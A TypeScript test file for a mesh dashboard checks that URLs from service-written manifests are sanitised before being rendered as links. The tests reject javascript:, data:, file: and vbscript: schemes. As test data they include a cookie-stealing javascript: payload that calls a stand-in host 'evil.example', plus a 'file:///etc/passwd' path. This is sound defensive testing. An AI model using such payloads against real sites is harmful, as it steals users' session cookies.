import { describe, it, expect } from 'vitest';
import { createStore } from './store';
import { manifestRefreshed } from './slices/estateSlice';
import { capabilitiesOf } from './slices/capabilitiesSlice';
import { safeHttpUrl, selectServiceLinks, selectVisibleServiceLinks } from './selectors';
import { fakeMeshApi } from '../test/fakeMeshApi';

const PAGE = 'https://mesh.example/mesh-ui.html';

const withServices = (manifestUrl?: string) => {
  const api = fakeMeshApi();
  const store = createStore(api, { capabilities: capabilitiesOf(api, manifestUrl) });
  store.dispatch(
    manifestRefreshed({
      generatedAtUtc: '2026-08-09T06:00:00Z',
      services: [
        {
          name: 'orders-api',
          status: 'healthy',
          contractDrift: false,
          specUrl: 'https://orders-api.example/benzene/spec',
          healthUrl: 'https://orders-api.example/healthcheck',
        },
        { name: 'quiet-api', status: 'healthy', contractDrift: false },
      ],
    }),
  );
  return store;
};

describe('untrusted URLs from a self-reported manifest', () => {
  it('refuses a javascript: URL rather than rendering it as a link', () => {
    // A manifest is written by the services themselves. Handing this to an anchor executes it on
    // click, and target="_blank" does not neutralise it.
    expect(safeHttpUrl('javascript:alert(1)', PAGE)).toBeNull();
  });

  it('refuses data: and other non-web schemes', () => {
    expect(safeHttpUrl('data:text/html,<script>alert(1)</script>', PAGE)).toBeNull();
    expect(safeHttpUrl('file:///etc/passwd', PAGE)).toBeNull();
    expect(safeHttpUrl('vbscript:msgbox(1)', PAGE)).toBeNull();
  });

  it('refuses a URL it cannot parse at all', () => {
    expect(safeHttpUrl('http://[not a url', PAGE)).toBeNull();
  });

  it('accepts http and https, resolving a relative one against the page', () => {
    expect(safeHttpUrl('https://orders-api.example/spec', PAGE)).toBe('https://orders-api.example/spec');
    expect(safeHttpUrl('/spec', PAGE)).toBe('https://mesh.example/spec');
  });

  it('treats a missing URL as no link, not as an error', () => {
    expect(safeHttpUrl(undefined, PAGE)).toBeNull();
    expect(safeHttpUrl(null, PAGE)).toBeNull();
    expect(safeHttpUrl('', PAGE)).toBeNull();
  });
});

describe('service links', () => {
  it('builds a relative spec-view href so it resolves in either deployment', () => {
    // Static files side by side, or both served from a pipeline — one href has to work in both.
    const store = withServices();
    const links = selectServiceLinks(store.getState(), 'orders-api', PAGE);

    expect(links.specViewHref).toMatch(/^mesh-spec-ui\.html\?/);
    expect(links.specViewHref).toContain('service=orders-api');
    // The page's own URL travels along, for the spec view's way back.
    expect(links.specViewHref).toContain(`mesh=${encodeURIComponent(PAGE)}`);
  });

  it('passes the manifest location on, so the spec view reads from the same place', () => {
    const store = withServices('/artifacts/manifest.json');
    expect(selectServiceLinks(store.getState(), 'orders-api', PAGE)).toMatchObject({
      specViewHref: expect.stringContaining(`manifest=${encodeURIComponent('/artifacts/manifest.json')}`),
    });
  });

  it('offers the self-reported links only when the manifest supplied them', () => {
    const store = withServices();
    expect(selectServiceLinks(store.getState(), 'orders-api', PAGE).healthHref).toBe(
      'https://orders-api.example/healthcheck',
    );
    expect(selectServiceLinks(store.getState(), 'quiet-api', PAGE).rawSpecHref).toBeNull();
  });

  it('drops a hostile self-reported URL while keeping the rest of the card', () => {
    const api = fakeMeshApi();
    const store = createStore(api, { capabilities: capabilitiesOf(api) });
    store.dispatch(
      manifestRefreshed({
        generatedAtUtc: '2026-08-09T06:00:00Z',
        services: [
          {
            name: 'hostile-api',
            status: 'healthy',
            contractDrift: false,
            specUrl: 'javascript:fetch("//evil.example?c="+document.cookie)',
            healthUrl: 'https://hostile-api.example/healthcheck',
          },
        ],
      }),
    );

    const links = selectServiceLinks(store.getState(), 'hostile-api', PAGE);
    expect(links.rawSpecHref).toBeNull();
    // One bad field costs one link, not the whole card.
    expect(links.healthHref).toBe('https://hostile-api.example/healthcheck');
    expect(links.specViewHref).not.toBeNull();
  });

  it('returns one stable array for the whole list', () => {
    // Mapping the per-service selector in the component minted a new array per store read and made
    // react-redux re-render the list continuously.
    const store = withServices();
    expect(selectVisibleServiceLinks(store.getState(), PAGE)).toBe(
      selectVisibleServiceLinks(store.getState(), PAGE),
    );
  });

  it('says nothing about a service that is not in the manifest', () => {
    const store = withServices();
    expect(selectServiceLinks(store.getState(), 'ghost', PAGE)).toEqual({
      specViewHref: null,
      rawSpecHref: null,
      healthHref: null,
    });
  });
});
